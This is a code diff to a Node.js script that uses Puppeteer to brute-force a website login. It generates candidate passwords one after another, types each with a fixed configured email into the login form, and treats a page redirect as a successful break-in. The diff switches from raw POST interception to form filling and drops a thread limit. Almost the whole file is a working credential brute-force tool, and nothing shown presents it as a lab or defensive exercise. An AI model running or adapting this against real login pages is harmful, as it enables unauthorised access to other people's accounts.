@@ -3,12 +3,14 @@ const WordGenerator = require('./wordGenerator');
 const config = require('../config');
 
 var browser, word;
-
-const maxthreads = 1000;
-var threads = 0;
 var stop = false;
 
-module.exports = async function start(min =1, max =20, startWord =WordGenerator.plage[0].repeat(min)){
+module.exports = {
+  start: start,
+  tryWord: tryWord,
+};
+
+async function start(min =4, max =20, startWord =WordGenerator.plage[0].repeat(min)){
   browser = await puppeteer.launch();
   word = startWord;
 
@@ -27,13 +29,11 @@ module.exports = async function start(min =1, max =20, startWord =WordGenerator.
 async function loop(max =20){
 	if(stop) return;
 
-	while(threads < maxthreads && word.length <= max){
+	while(word.length <= max){
 		word = WordGenerator.getNextWord(word);
-		threads++;
     var result = await tryWord(word);
     console.log(`${word} : ${result}`);
     if ( result ) return word
-    threads--;
 	}
   return false;
 }
@@ -42,17 +42,14 @@ async function loop(max =20){
 // Essayer de se connecter sur une URL a partir d'un mot : word 
 async function tryWord(word){
   const page = await browser.newPage();
-  await page.setRequestInterception(true);
+  await page.goto(config.URL);
+  await page.waitForSelector('#email');
+  await page.type('#email', config.EMAIL);
+  await page.type('#password', word);
+  await page.click('#submit');
+  await page.waitForTimeout(3000);
 
-  page.on('request', interceptedRequest => {
-    interceptedRequest.continue({
-      'method': 'POST',
-      'postData': `email=${config.EMAIL}&password=${word}`
-    });
-  });
-  const response = await page.goto(config.URL);
-  const responseBody = await response.text();
-
+  if(page.url() != config.URL) return true
   await page.close();
-  return JSON.parse(responseBody).success;
+  return false
 }
